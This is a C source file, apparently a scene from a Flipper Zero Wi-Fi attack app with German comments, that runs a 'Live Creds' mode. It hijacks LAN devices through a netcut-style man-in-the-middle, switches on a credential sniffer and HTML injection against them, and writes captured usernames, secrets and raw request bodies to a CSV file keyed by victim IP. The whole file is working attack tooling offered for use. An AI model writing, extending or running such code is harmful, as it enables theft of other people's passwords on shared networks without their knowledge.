#include "../wlan_app.h"
#include "../wlan_netcut.h"
#include "../wlan_cred_sniff.h"
#include "../wlan_html_inject.h"

#include <storage/storage.h>
#include <furi_hal_rtc.h>
#include <datetime/datetime.h>
#include <stdio.h>
#include <string.h>

// Wie viele Devices maximal automatisch (ohne explizite Vorauswahl) in den
// Monitor-Mode versetzt werden — jeder gemonitorte Frame round-trippt durch die
// einzige async-TX-Queue; zu viele saturieren das und das Opfer verliert Pakete.
#define LC_AUTO_MONITOR_MAX 4

#define LC_SCRATCH 8

static Storage* s_lc_storage = NULL;
static File* s_lc_file = NULL;
static WlanCredEntry s_lc_scratch[LC_SCRATCH]; // Drain-Puffer (GUI-Stack ist knapp → static)
static WlanCredEntry s_lc_snap[WLAN_CRED_RING_SIZE];
static bool s_lc_active; // true wenn Monitor läuft (sonst Fehlerbildschirm)

// ---------------------------------------------------------------------------
// CSV
// ---------------------------------------------------------------------------
static void lc_csv_escape(char* s) {
    for(; *s; s++)
        if(*s == ',' || *s == '\n' || *s == '\r') *s = ' ';
}

static void lc_open_csv(void) {
    s_lc_storage = furi_record_open(RECORD_STORAGE);
    storage_common_mkdir(s_lc_storage, "/ext/wifi");
    storage_common_mkdir(s_lc_storage, "/ext/wifi/live_creds");
    const char* path = "/ext/wifi/live_creds/creds.csv";
    bool exists = storage_common_stat(s_lc_storage, path, NULL) == FSE_OK;
    s_lc_file = storage_file_alloc(s_lc_storage);
    if(!storage_file_open(s_lc_file, path, FSAM_WRITE, FSOM_OPEN_APPEND)) {
        storage_file_free(s_lc_file);
        s_lc_file = NULL;
        furi_record_close(RECORD_STORAGE);
        s_lc_storage = NULL;
        return;
    }
    if(!exists) {
        const char* hdr = "timestamp,victim_ip,proto,host,peer,user,secret,raw\n";
        storage_file_write(s_lc_file, hdr, strlen(hdr));
    }
}

static void lc_close_csv(void) {
    if(s_lc_file) {
        storage_file_close(s_lc_file);
        storage_file_free(s_lc_file);
        s_lc_file = NULL;
    }
    if(s_lc_storage) {
        furi_record_close(RECORD_STORAGE);
        s_lc_storage = NULL;
    }
}

static void lc_write_csv(const WlanCredEntry* e) {
    if(!s_lc_file) return;
    DateTime dt;
    furi_hal_rtc_get_datetime(&dt);
    const uint8_t* vi = (const uint8_t*)&e->victim_ip;
    const uint8_t* pi = (const uint8_t*)&e->peer_ip;
    char host[WLAN_CRED_STR_MAX], user[WLAN_CRED_STR_MAX], secret[WLAN_CRED_STR_MAX];
    char raw[WLAN_CRED_RAW_MAX];
    strncpy(host, e->host, sizeof(host));
    host[sizeof(host) - 1] = 0;
    lc_csv_escape(host);
    strncpy(user, e->user, sizeof(user));
    user[sizeof(user) - 1] = 0;
    lc_csv_escape(user);
    strncpy(secret, e->secret, sizeof(secret));
    secret[sizeof(secret) - 1] = 0;
    lc_csv_escape(secret);
    strncpy(raw, e->raw_body, sizeof(raw));
    raw[sizeof(raw) - 1] = 0;
    lc_csv_escape(raw);
    char line[480];
    int n = snprintf(
        line,
        sizeof(line),
        "%04u-%02u-%02u %02u:%02u:%02u,%u.%u.%u.%u,%s,%s,%u.%u.%u.%u:%u,%s,%s,%s\n",
        dt.year,
        dt.month,
        dt.day,
        dt.hour,
        dt.minute,
        dt.second,
        vi[0],
        vi[1],
        vi[2],
        vi[3],
        e->proto,
        host,
        pi[0],
        pi[1],
        pi[2],
        pi[3],
        (unsigned)e->peer_port,
        user,
        secret,
        raw);
    if(n > 0) storage_file_write(s_lc_file, line, (size_t)n);
}

// ---------------------------------------------------------------------------
// Monitor-Mode armen/disarmen
// ---------------------------------------------------------------------------
// sniff_monitor setzen:
//  - hat der Aufrufer schon Devices vorgemerkt → genau die behalten
//  - sonst, gibt es aktive Targets → die (gedeckelt auf LC_AUTO_MONITOR_MAX)
//  - sonst → die ersten LC_AUTO_MONITOR_MAX Devices
// Geblockte Devices werden nie gemonitort (block ist exklusiv).
// Liefert true wenn mind. ein Device gemonitort wird.
static bool lc_arm_monitor(WlanApp* app) {
    bool pre = false;
    for(uint16_t i = 0; i < app->device_count; i++) {
        if(app->devices[i].sniff_monitor) {
            pre = true;
            break;
        }
    }
    if(pre) {
        bool any = false;
        for(uint16_t i = 0; i < app->device_count; i++) {
            if(app->devices[i].block_internet) app->devices[i].sniff_monitor = false;
            if(app->devices[i].sniff_monitor) any = true;
        }
        if(any) return true;
        // alle vorgemerkten waren geblockt → Auto-Logik unten
    }

    bool any_target = false;
    for(uint16_t i = 0; i < app->device_count; i++) {
        if(app->devices[i].active && !app->devices[i].block_internet) {
            any_target = true;
            break;
        }
    }
    uint16_t budget = LC_AUTO_MONITOR_MAX;
    bool any = false;
    for(uint16_t i = 0; i < app->device_count; i++) {
        WlanDeviceRecord* d = &app->devices[i];
        bool eligible = !d->block_internet && (!any_target || d->active);
        bool want = eligible && budget > 0;
        if(want) budget--;
        d->sniff_monitor = want;
        if(want) any = true;
    }
    return any;
}

static void lc_disarm_monitor(WlanApp* app) {
    for(uint16_t i = 0; i < app->device_count; i++)
        app->devices[i].sniff_monitor = false;
}

static void lc_show_error(WlanApp* app, const char* msg) {
    widget_reset(app->widget);
    widget_add_string_element(
        app->widget, 64, 26, AlignCenter, AlignCenter, FontPrimary, "Live Creds");
    widget_add_string_element(app->widget, 64, 42, AlignCenter, AlignCenter, FontSecondary, msg);
    view_dispatcher_switch_to_view(app->view_dispatcher, WlanAppViewWidget);
}

// ---------------------------------------------------------------------------
void wlan_app_scene_live_creds_on_enter(void* context) {
    WlanApp* app = context;
    s_lc_active = false;

    if(!wlan_netcut_preflight(app->netcut)) {
        lc_disarm_monitor(app);
        lc_show_error(app, "Connect as STA + scan LAN");
        return;
    }
    if(!lc_arm_monitor(app)) {
        lc_disarm_monitor(app);
        lc_show_error(app, "No LAN device - scan first");
        return;
    }

    wlan_cred_sniff_set_armed(app->cred_sniff, true);
    wlan_html_inject_set_armed(true);
    wlan_netcut_apply(app->netcut, app->devices, (uint8_t)app->device_count);

    wlan_live_creds_view_reset(app->live_creds_view_obj);
    view_dispatcher_switch_to_view(app->view_dispatcher, WlanAppViewLiveCreds);
    lc_open_csv();
    s_lc_active = true;
}

bool wlan_app_scene_live_creds_on_event(void* context, SceneManagerEvent event) {
    WlanApp* app = context;

    if(event.type == SceneManagerEventTypeTick && s_lc_active) {
        uint32_t n;
        do {
            n = wlan_cred_sniff_drain(app->cred_sniff, s_lc_scratch, LC_SCRATCH);
            for(uint32_t i = 0; i < n; i++)
                lc_write_csv(&s_lc_scratch[i]);
        } while(n == LC_SCRATCH);
        uint32_t m = wlan_cred_sniff_snapshot(app->cred_sniff, s_lc_snap, WLAN_CRED_RING_SIZE);
        wlan_live_creds_view_set_entries(
            app->live_creds_view_obj, s_lc_snap, m, wlan_cred_sniff_total(app->cred_sniff));
    }
    return false;
}

void wlan_app_scene_live_creds_on_exit(void* context) {
    WlanApp* app = context;
    lc_close_csv();
    wlan_cred_sniff_set_armed(app->cred_sniff, false);
    wlan_html_inject_set_armed(false);
    lc_disarm_monitor(app);
    if(s_lc_active) {
        // Worker schickt im Hintergrund Restore-Frames für die ehemals
        // gemonitorten Devices — kein blockierendes Popup nötig.
        wlan_netcut_apply(app->netcut, app->devices, (uint8_t)app->device_count);
    }
    widget_reset(app->widget);
    s_lc_active = false;
}
